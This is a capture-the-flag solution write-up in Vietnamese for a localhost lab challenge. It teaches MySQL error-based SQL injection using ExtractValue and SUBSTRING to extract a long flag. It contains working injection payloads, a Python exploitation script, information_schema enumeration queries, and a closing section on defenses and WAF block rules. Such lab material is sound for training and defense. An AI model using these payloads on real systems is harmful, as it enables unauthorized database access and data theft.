# SQLi-011 Solution: MySQL ExtractValue Error-based với Multi-part Extraction

## 📋 Thông Tin Challenge

- **URL:** `http://localhost:5011/article?id=1`
- **Tham số vulnerable:** `id`
- **Kỹ thuật:** ExtractValue Error-based với SUBSTRING để bypass giới hạn 32 ký tự
- **Target:** Bảng `flags`, cột `value`

---

## 🔍 BƯỚC 1: Detection - Phát Hiện Lỗi

### 1.1. Test Basic Injection

```
http://localhost:5011/article?id=1'
```

**Kết quả:**

```
1064 (42000): You have an error in your SQL syntax...
```

✅ **Kết luận:** Có SQL Injection!

### 1.2. Test Boolean-based

```
http://localhost:5011/article?id=1 AND 1=1-- -
http://localhost:5011/article?id=1 AND 1=2-- -
```

**Kết quả:**

- `1=1` → Hiển thị bài viết
- `1=2` → Không hiển thị

✅ **Kết luận:** Logic hoạt động, có thể inject được!

### 1.3. Test ExtractValue

```
http://localhost:5011/article?id=1 AND ExtractValue(1,CONCAT(0x7e,version()))-- -
```

**Kết quả:**

```
XPATH syntax error: '~8.0.x'
```

✅ **Hoạt động!** Nhưng có giới hạn 32 ký tự

---

## 🎯 BƯỚC 2: Hiểu Giới Hạn ExtractValue

### Vấn Đề: Giới Hạn 32 Ký Tự

ExtractValue chỉ hiển thị **tối đa 32 ký tự** trong error message. Nếu flag dài hơn, phần còn lại bị cắt.

### Test Với Flag:

```
http://localhost:5011/article?id=1 AND ExtractValue(1,CONCAT(0x7e,(SELECT value FROM flags LIMIT 0,1)))-- -
```

**Kết quả có thể:**

```
XPATH syntax error: '~FLAG{this_is_a_very_long_flag'
```

⚠️ **Vấn đề:** Flag bị cắt ở ký tự thứ 32!

### So Sánh Các Kỹ Thuật Error-based

| Kỹ thuật         | Ưu điểm               | Nhược điểm                 | Giải pháp                      |
| ---------------- | --------------------- | -------------------------- | ------------------------------ |
| **EXTRACTVALUE** | Đơn giản, dễ sử dụng  | **Giới hạn 32 ký tự**      | Dùng SUBSTRING chia nhiều phần |
| **UPDATEXML**    | Đơn giản, dễ sử dụng  | **Giới hạn 32 ký tự**      | Dùng SUBSTRING chia nhiều phần |
| **FLOOR+RAND**   | Không giới hạn độ dài | Syntax phức tạp, khó debug | Không cần SUBSTRING            |

**Lựa chọn cho challenge này:** ExtractValue với SUBSTRING vì đơn giản và dễ hiểu hơn FLOOR+RAND.

---

## 🧠 BƯỚC 3: Giải Pháp - Multi-part Extraction

### 3.1. Chiến Lược

Chia flag thành nhiều phần và extract từng phần:

1. **Payload 1:** Lấy 31 ký tự đầu (trừ ký tự `~`)
2. **Payload 2:** Lấy phần còn lại bằng SUBSTRING từ vị trí 30

### 3.2. Cơ Chế SUBSTRING

```sql
SUBSTRING(string, start, length)
-- hoặc
SUBSTRING(string, start)  -- lấy từ start đến hết
```

**Ví dụ:**

```sql
SUBSTRING('FLAG{abcdef}', 1, 5)  → 'FLAG{'
SUBSTRING('FLAG{abcdef}', 6)     → 'abcdef}'
```

**Lưu ý về index:**

- MySQL: SUBSTRING bắt đầu từ index **1** (không phải 0)
- Nếu flag dài 50 ký tự và lấy được 31 ký tự đầu, cần lấy từ vị trí 30 trở đi (overlap 1-2 ký tự để đảm bảo không bỏ sót)

### 3.3. Tính Toán Vị Trí Cắt

ExtractValue trả về:

- Ký tự đầu: `~` (delimiter, không phải data)
- 31 ký tự tiếp theo: Phần đầu của flag

**Ví dụ flag dài 45 ký tự:**

```
FLAG{this_is_a_very_long_flag_for_testing_45}
^                             ^
1                             30               45
```

- Payload 1 lấy: ký tự 1-31 → `FLAG{this_is_a_very_long_fla`
- Payload 2 lấy: ký tự 30-45 → `ag_for_testing_45}`
- Ghép lại (overlap ký tự 30-31): `FLAG{this_is_a_very_long_flag_for_testing_45}`

---

## 🚀 BƯỚC 4: Exploit - Lấy Flag

### 4.1. Payload 1: Lấy Phần Đầu

```
http://localhost:5011/article?id=1 AND ExtractValue(1,CONCAT(0x7e,(SELECT value FROM flags LIMIT 0,1)))-- -
```

**URL Encoded:**

```
http://localhost:5011/article?id=1%20AND%20ExtractValue(1,CONCAT(0x7e,(SELECT%20value%20FROM%20flags%20LIMIT%200,1)))--%20-
```

**Breakdown:**

- `ExtractValue(1, ...)`: Function tạo XPATH error
- `CONCAT(0x7e, ...)`: Nối `~` với data để trigger invalid XPATH
- `SELECT value FROM flags LIMIT 0,1`: Lấy flag đầu tiên
- `-- -`: Comment phần query sau

**Kết quả:**

```
XPATH syntax error: '~FLAG{this_is_a_very_long_fla'
```

**Flag part 1:** `FLAG{this_is_a_very_long_fla`

### 4.2. Payload 2: Lấy Phần Còn Lại

```
http://localhost:5011/article?id=1 AND ExtractValue(1,CONCAT(0x7e,SUBSTRING((SELECT value FROM flags LIMIT 0,1),30)))-- -
```

**URL Encoded:**

```
http://localhost:5011/article?id=1%20AND%20ExtractValue(1,CONCAT(0x7e,SUBSTRING((SELECT%20value%20FROM%20flags%20LIMIT%200,1),30)))--%20-
```

**Breakdown:**

- `SUBSTRING((SELECT value FROM flags LIMIT 0,1), 30)`: Lấy từ ký tự thứ 30 đến hết
- Phần còn lại giống payload 1

**Kết quả:**

```
XPATH syntax error: '~ag_for_testing_extractvalue_}'
```

**Flag part 2:** `ag_for_testing_extractvalue_}`

### 4.3. Ghép Flag

```
Part 1: FLAG{this_is_a_very_long_fla
Part 2:                          ag_for_testing_extractvalue_}
                                 ^^
                               overlap

Full Flag: FLAG{this_is_a_very_long_flag_for_testing_extractvalue_}
```

---

## 🔧 BƯỚC 5: Automation Script

### 5.1. Python Script

```python
#!/usr/bin/env python3
import requests
import re

BASE_URL = "http://localhost:5011/article"

def extract_part(payload):
    """Extract data from error message"""
    r = requests.get(BASE_URL, params={"id": payload})
    match = re.search(r"XPATH syntax error: '~([^']*)'", r.text)
    return match.group(1) if match else ""

# Payload 1: Get first 31 characters
payload1 = "1 AND ExtractValue(1,CONCAT(0x7e,(SELECT value FROM flags LIMIT 0,1)))-- -"
part1 = extract_part(payload1)
print(f"[+] Part 1: {part1}")

# Payload 2: Get remaining characters from position 30
payload2 = "1 AND ExtractValue(1,CONCAT(0x7e,SUBSTRING((SELECT value FROM flags LIMIT 0,1),30)))-- -"
part2 = extract_part(payload2)
print(f"[+] Part 2: {part2}")

# Combine parts (part2 starts at position 30, so we take part1[0:29] + part2)
flag = part1[:29] + part2
print(f"\n[+] Full Flag: {flag}")
```

### 5.2. Chạy Script

```bash
python3 exploit.py
```

**Output:**

```
[+] Part 1: FLAG{this_is_a_very_long_fla
[+] Part 2: ag_for_testing_extractvalue_}

[+] Full Flag: FLAG{this_is_a_very_long_flag_for_testing_extractvalue_}
```

---

## 📊 BƯỚC 6: Tổng Kết

### 6.1. Key Takeaways

1. **ExtractValue giới hạn 32 ký tự** (bao gồm ký tự `~`)
2. **SUBSTRING giải quyết vấn đề** bằng cách chia data thành nhiều phần
3. **Overlap là quan trọng** để không bỏ sót data khi ghép
4. **MySQL index bắt đầu từ 1** (không phải 0)

### 6.2. Challenge Progression

```
SQLi-009: EXTRACTVALUE basic (flag ngắn)
    ↓
SQLi-010: UPDATEXML basic (flag ngắn)
    ↓
SQLi-011: EXTRACTVALUE + SUBSTRING (flag dài > 32 ký tự)  ← YOU ARE HERE
    ↓
SQLi-012: FLOOR+RAND (extract toàn bộ trong 1 lần)
```

### 6.3. So Sánh 2 Approach

| Approach                   | Số Request | Độ Phức Tạp | Độ Tin Cậy | Use Case                  |
| -------------------------- | ---------- | ----------- | ---------- | ------------------------- |
| **ExtractValue+SUBSTRING** | 2-3        | Đơn giản    | Cao        | Flag < 100 ký tự, học tập |
| **FLOOR+RAND**             | 1          | Phức tạp    | Trung bình | Flag bất kỳ, production   |

### 6.4. Real-world Scenarios

**Khi nào dùng ExtractValue + SUBSTRING?**

- Flag/data ngắn (< 100 ký tự)
- Cần độ tin cậy cao
- WAF không block XPATH functions
- Học tập và hiểu về error-based injection

**Khi nào dùng FLOOR+RAND?**

- Data rất dài (> 100 ký tự)
- Muốn extract trong 1 request
- XPATH functions bị block
- Bypass WAF detection

---

## 🎓 BƯỚC 7: Kiến Thức Mở Rộng

### 7.1. ExtractValue Function

```sql
ExtractValue(xml_frag, xpath_expr)
```

- `xml_frag`: XML document (thường dùng dummy value như `1`)
- `xpath_expr`: XPath expression

**Cách hoạt động:**

1. MySQL parse `xpath_expr` như một XPath
2. Nếu XPath invalid → **XPATH syntax error**
3. Error message chứa **phần đầu của invalid XPath** (max 32 chars)

**Ví dụ:**

```sql
ExtractValue(1, '~test')
→ XPATH syntax error: '~test'
```

### 7.2. Vì Sao Dùng 0x7e (~)?

- `0x7e` = ký tự `~` (tilde)
- `~` là ký tự **không hợp lệ** ở đầu XPath
- Đảm bảo luôn trigger error
- Dễ phát hiện trong error message (unique delimiter)

**Thử nghiệm:**

```sql
-- OK: Bắt đầu bằng /
ExtractValue(1, '/test')  → Không error

-- ERROR: Bắt đầu bằng ~
ExtractValue(1, '~test')  → XPATH syntax error: '~test'
```

### 7.3. Alternative Delimiters

Ngoài `~`, có thể dùng:

```sql
-- Dùng # (hash)
CONCAT(0x23, data)  → #data

-- Dùng : (colon) - có thể bị parse
CONCAT(0x3a, data)  → :data

-- Dùng $ (dollar)
CONCAT(0x24, data)  → $data
```

**Recommend:** Dùng `~` hoặc `#` vì **chắc chắn invalid**.

### 7.4. Why Not UpdateXML?

UpdateXML hoạt động tương tự:

```sql
UpdateXML(xml_target, xpath_expr, new_xml)
```

**So sánh:**

| Function     | Parameters | Usage                      |
| ------------ | ---------- | -------------------------- |
| ExtractValue | 2          | Đơn giản hơn               |
| UpdateXML    | 3          | Cần thêm parameter (dummy) |

**Cả 2 đều giới hạn 32 ký tự**, nên ExtractValue được ưu tiên vì **syntax ngắn gọn hơn**.

---

## 🛡️ BƯỚC 8: Defense & Mitigation

### 8.1. Vulnerable Code

```python
# SQLi-011/src/app.py
query = f"SELECT * FROM articles WHERE id = {article_id}"
```

❌ **Vấn đề:** String concatenation, không sanitize input.

### 8.2. Fixed Code - Prepared Statements

```python
# Secure version
cursor.execute("SELECT * FROM articles WHERE id = %s", (article_id,))
```

✅ **Lợi ích:**

- Input được escape tự động
- SQL và data tách biệt
- Ngăn chặn hoàn toàn SQL Injection

### 8.3. Additional Protections

1. **Input Validation:**

   ```python
   if not article_id.isdigit():
       return "Invalid ID", 400
   ```

2. **Error Handling:**

   ```python
   try:
       cursor.execute(query)
   except Exception:
       return "Error occurred", 500  # Không expose SQL error
   ```

3. **WAF Rules:**

   ```
   Block: ExtractValue, UpdateXML, FLOOR, RAND, GROUP BY
   Monitor: CONCAT, SUBSTRING, LIMIT
   ```

4. **Least Privilege:**
   ```sql
   -- User chỉ có quyền SELECT
   GRANT SELECT ON database.articles TO 'webapp'@'localhost';
   ```

---

## 🎯 Next Steps

**Tiếp tục học:** [SQLi-012: FLOOR+RAND Double Query](../../SQLi-012/)

**Practice more:** Thử inject các table khác trong database:

```sql
-- List databases
ExtractValue(1,CONCAT(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1)))

-- List tables
ExtractValue(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))

-- List columns
ExtractValue(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))
```

---

## 📚 References

- [MySQL ExtractValue Documentation](https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

**🏁 Challenge Complete! Flag obtained using ExtractValue + SUBSTRING technique.**
